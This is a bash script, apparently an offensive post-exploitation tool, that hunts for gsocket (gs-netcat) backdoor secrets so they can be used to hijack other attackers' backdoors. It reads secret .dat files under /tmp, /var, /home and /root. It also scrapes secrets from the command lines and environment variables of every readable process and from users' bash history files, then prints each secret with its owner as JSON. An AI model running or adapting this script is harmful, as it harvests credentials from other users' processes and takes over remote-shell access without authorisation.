#!/bin/bash
# GSSocket Secret Hunter - Find ALL gsocket secrets on system
# Use these to HIJACK other hackers' backdoors!

echo '{"secrets":['
first=1

# Method 1: .dat files (official gsocket secret storage)
for f in $(find /tmp /dev/shm /var /home /root 2>/dev/null -name "*.dat" -o -name "defunct.dat" 2>/dev/null | head -50); do
    [ -f "$f" ] || continue
    secret=$(head -c 100 "$f" 2>/dev/null | tr -d '\n\r')
    [ -z "$secret" ] && continue
    [ ${#secret} -lt 5 ] && continue
    owner=$(stat -c '%U' "$f" 2>/dev/null)
    [ $first -eq 0 ] && echo -n ','
    echo -n "{\"source\":\"file\",\"path\":\"$f\",\"secret\":\"$secret\",\"owner\":\"$owner\"}"
    first=0
done

# Method 2: Process cmdlines
for pid in /proc/[0-9]*; do
    [ -r "$pid/cmdline" ] || continue
    cmd=$(tr '\0' ' ' < "$pid/cmdline" 2>/dev/null)
    
    # Look for -s argument
    secret=$(echo "$cmd" | grep -oE '\-s [A-Za-z0-9]+' | awk '{print $2}')
    [ -z "$secret" ] && continue
    [ ${#secret} -lt 5 ] && continue
    
    p=$(basename "$pid")
    user=$(stat -c '%U' "$pid" 2>/dev/null)
    [ $first -eq 0 ] && echo -n ','
    echo -n "{\"source\":\"cmdline\",\"pid\":$p,\"secret\":\"$secret\",\"owner\":\"$user\"}"
    first=0
done

# Method 3: Process environment (if readable)
for pid in /proc/[0-9]*; do
    [ -r "$pid/environ" ] || continue
    
    # Look for GS_ARGS, S=, GS_SECRET in env
    secret=$(tr '\0' '\n' < "$pid/environ" 2>/dev/null | grep -E '^(GS_ARGS|S|GS_SECRET|SECRET)=' | grep -oE '[A-Za-z0-9]{10,}' | head -1)
    [ -z "$secret" ] && continue
    
    p=$(basename "$pid")
    user=$(stat -c '%U' "$pid" 2>/dev/null)
    [ $first -eq 0 ] && echo -n ','
    echo -n "{\"source\":\"environ\",\"pid\":$p,\"secret\":\"$secret\",\"owner\":\"$user\"}"
    first=0
done

# Method 4: History files
for f in /root/.bash_history /home/*/.bash_history; do
    [ -r "$f" ] || continue
    
    # Look for gs-netcat -s commands
    secret=$(grep -oE 'gs-netcat.*-s [A-Za-z0-9]+' "$f" 2>/dev/null | grep -oE '\-s [A-Za-z0-9]+' | awk '{print $2}' | tail -1)
    [ -z "$secret" ] && continue
    
    owner=$(stat -c '%U' "$f" 2>/dev/null)
    [ $first -eq 0 ] && echo -n ','
    echo -n "{\"source\":\"history\",\"path\":\"$f\",\"secret\":\"$secret\",\"owner\":\"$owner\"}"
    first=0
done

echo ']}'
